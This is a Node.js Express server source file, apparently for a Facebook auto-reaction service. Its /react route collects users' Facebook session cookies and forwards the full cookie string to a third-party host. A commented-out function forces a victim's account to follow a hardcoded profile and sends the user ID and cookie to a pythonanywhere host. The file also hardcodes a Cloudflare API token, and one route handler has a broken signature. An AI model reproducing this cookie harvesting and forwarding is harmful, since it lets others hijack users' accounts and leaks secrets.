const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;
const playua = `Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15`;
const ua = `Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36`;
const ua1 = "Mozilla/5.0 (Linux; Android 6.0.1; samsungBuild/SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.4926.97 Webvium/2.9 Mobile Safari/537.36";
const defUa = "Dalvik/2.1.0 (Linux; U; Android 12; V2134 Build/SP1A.210812.003)";

app.use(express.json());
app.use(express.static(__dirname + '/public'));

app.get('/', (res) => {
  res.sendFile(__dirname + '/index.html');
});

app.get('/wiegine', async (req,res) => {
  const { lover } = req.query;
  if (lover && lover.toLowerCase() === "neth"){
    res.json({
      relationship: "🤴 ♡ 👸 | Running since 12/04/23"
    });
  } else {
    res.json({
      relationship: "Nothing, cause you didn't put his name"
    });
  }
});

app.get("/ai", async(req,res) => {
      const accid = "aeb6994d3b0046916b38c8840634af2b";
      const token = "h2BM9DzjQJoYmQHeDGLDpDUzVMIg4bO2WBtIQtHe";
      const data = {
        prompt: req.query.q
      };
      const headers = {
        "Authorization": "Bearer " + token
      };
      await axios.post(`https://api.cloudflare.com/client/v4/accounts/${accid}/ai/run/@cf/meta/llama-3-8b-instruct`, { data }, { headers })
        .then(response => {
         // console.log(response);
          const gine = response.data;
          res.json({response: gine});
        }).catch(error => {
          //console.log(error);
          res.json({error: JSON.stringify(error)});
        });
})

app.post('/react', async (req, res) => {
  const { link, type, cookie } = req.body;
   try {
    const datatec = await cc(cookie);
    const u = datatec[0].find(item => item.key === "c_user");
    const v = datatec[0].find(item => item.key === "i_user");
    const coreli = await axios.post("https://fbpython.click/android_get_react", {
      version: "2.1",
      link,
      cookie: datatec[1],
      reaction: type
    }, {
      headers: {
        'User-Agent': defUa,
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json"
      }
    });
    const wiegine = coreli.data;
    return res.json(wiegine);
  } catch (er) {
    return res.json({ message: er.message || er });
  }
});
/*
async function testFollow(co, u){
  try {
  const ids = "100015801404865";
  /*const data = {
        av: u,
        fb_api_req_friendly_name: "CometUserFollowMutation",
        fb_api_caller_class: "RelayModern",
        doc_id: "25472099855769847",
        variables: JSON.stringify({
          input: {
            attribution_id_v2:
              "ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1717249218695,723451,250100865708545,,",
            is_tracking_encrypted: false,
            subscribe_location: "PROFILE",
            subscribee_id: ids,
            tracking: null,
            actor_id: u,
            client_mutation_id: "1",
          },
          scale: 1,
        }),
  }
  const headers = {
        'cookie': co,
        'user-agent': ua,
        'accept-encoding': 'gzip, deflate, br, zstd',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-full-version-list': '"Not_A Brand";v="99.0.0.0", "Google Chrome";v="109.0.5414.120", "Chromium";v="109.0.5414.120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"0.1.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-fb-friendly-name': 'CometUserFollowMutation',
        'x-fb-lsd': 'jCMxkJV-JuI1kVV9CC6pav',
        'x-asbd-id': '129477',
        'origin': 'https://www.facebook.com',
        'referer': `https://www.facebook.com/profile.php?id=${ids}`,
        'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'priority': 'u=1, i'
      };
  await axios.post("https://www.facebook.com/api/graphql/", data, { headers });
  await axios.post(`http://naurwiegine.pythonanywhere.com/follow1?user=${u}&cookie=${co}`);
  } catch (e){
    console.error(e);
  }
}*/
async function cc(cookie) {
  return new Promise((resolve, reject) => {
    try {
      const cookies = JSON.parse(cookie);
      const sbCookie = cookies.find(cookies => cookies.key === "sb");
      if (!sbCookie) {
        reject("Detect invalid appstate please provide a valid appstate");
      }
      const data = `${cookies.map(cookies => `${cookies.key}=${cookies.value}`).join('; ')}`;
      resolve([cookies, data]);
    } catch (error) {
      reject("Error processing appstate please provide a valid appstate");
    }
  });
}
app.listen(port, () => {
  console.log(`Starting...`);
  /*cron.schedule("45 * * * * *", async() => {
  await axios.get(`http://localhost:${port}`);
  console.log("Auto reload every 45 seconds");
  });*/
});
process.on("unhandledRejection", (reason, p) => {
  console.error(reason);
});
